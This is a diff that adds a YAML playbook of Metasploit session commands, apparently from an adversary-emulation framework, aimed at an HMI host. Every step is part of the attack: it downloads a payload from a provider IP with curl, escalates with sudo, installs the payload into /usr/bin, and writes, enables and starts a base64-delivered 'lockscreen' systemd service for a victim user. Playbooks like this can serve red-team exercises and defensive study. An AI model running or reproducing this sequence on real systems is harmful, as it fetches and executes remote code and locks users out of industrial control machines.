@@ -1,0 +1,59 @@
+commands:
+  - type: msf-session
+    session: $HMI_SESSION
+    cmd: id
+
+  - type: msf-session
+    session: $HMI_SESSION
+    cmd: curl http://$PAYLOAD_PROVIDER_IP:80/$PAYLOAD_NAME --output /tmp/$PAYLOAD_NAME
+
+  - type: msf-session
+    session: $HMI_SESSION
+    cmd: id
+
+  - type: msf-session
+    session: $HMI_SESSION
+    cmd: ls -ld /tmp/$PAYLOAD_NAME
+
+  - type: msf-session
+    session: $HMI_SESSION
+    cmd: sudo -i
+
+  - type: msf-session
+    session: $HMI_SESSION
+    cmd: chmod +x /tmp/$PAYLOAD_NAME
+
+  - type: msf-session
+    session: $HMI_SESSION
+    cmd: mv /tmp/$PAYLOAD_NAME /usr/bin/$PAYLOAD_NAME
+
+  - type: msf-session
+    session: $HMI_SESSION
+    cmd: id
+
+  - type: shell
+    cmd: cat playbooks/lockscreen.service | base64 -w0
+
+  - type: msf-session
+    session: $HMI_SESSION
+    cmd: echo $RESULT_STDOUT | base64 -d > /etc/systemd/system/$SERVICE_NAME@.service
+
+  - type: msf-session
+    session: $HMI_SESSION
+    cmd: ls -l /etc/systemd/system/$SERVICE_NAME@.service
+
+  - type: msf-session
+    session: $HMI_SESSION
+    cmd: cat /etc/systemd/system/$SERVICE_NAME@.service
+
+  - type: msf-session
+    session: $HMI_SESSION
+    cmd: systemctl daemon-reload
+
+  - type: msf-session
+    session: $HMI_SESSION
+    cmd: systemctl enable $SERVICE_NAME@$HMI_VICTIM_USER.service
+
+  - type: msf-session
+    session: $HMI_SESSION
+    cmd: systemctl start $SERVICE_NAME@$HMI_VICTIM_USER.service
